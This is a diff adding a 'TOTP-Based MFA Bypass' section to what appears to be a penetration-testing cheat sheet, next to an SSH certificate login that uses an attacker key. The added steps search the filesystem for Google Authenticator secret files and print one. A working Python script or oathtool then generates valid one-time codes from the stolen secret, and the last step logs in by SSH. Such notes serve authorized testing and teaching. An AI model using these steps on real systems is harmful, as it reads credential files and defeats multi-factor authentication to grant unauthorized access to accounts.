@@ -82,3 +82,44 @@ This scenario depends on use case, there is no fixed way. Example could be a pub
 
     ssh -o StrictHostKeyChecking=no -i attacker_key -o CertificateFile=attacker_key-cert.pub PRINCIPAL@TARGET_HOST
 
+## TOTP-Based MFA Bypass
+
+### 1) Search for the secret (example Google Authenticator)
+
+    find / -iname .google_authenticator 2>/dev/null
+
+### 2) Print contents if found
+
+First line is the base32 secret
+
+    cat /opt/backups/mfa/.google_authenticator
+
+### 3) Decode secret
+
+Oauthtool
+
+    oauthtool --totp -b BASE32_SECRET
+
+Python
+
+    import base64, hmac, hashlib, struct, sys, time
+    
+    def totp(secret, digits=6, period=30, algo=hashlib.sha1, t=None):
+        key = secret.replace(" ", "").upper()
+        key = base64.b32decode(key + "=" * (-len(key) % 8))           # fix missing padding
+        counter = int((time.time() if t is None else t) // period)    # RFC 6238 time step
+        mac = hmac.new(key, struct.pack(">Q", counter), algo).digest()  # RFC 4226 HOTP
+        off = mac[-1] & 0x0F                                          # dynamic truncation
+        code = (struct.unpack(">I", mac[off:off + 4])[0] & 0x7FFFFFFF) % 10**digits
+        return str(code).zfill(digits)
+    
+    if __name__ == "__main__":
+        print(totp(sys.argv[1]))
+
+Run as
+
+    python3 totp.py BASE32_SECRET
+
+### 4) Connect to target
+
+    ssh USER@TARGET_HOST
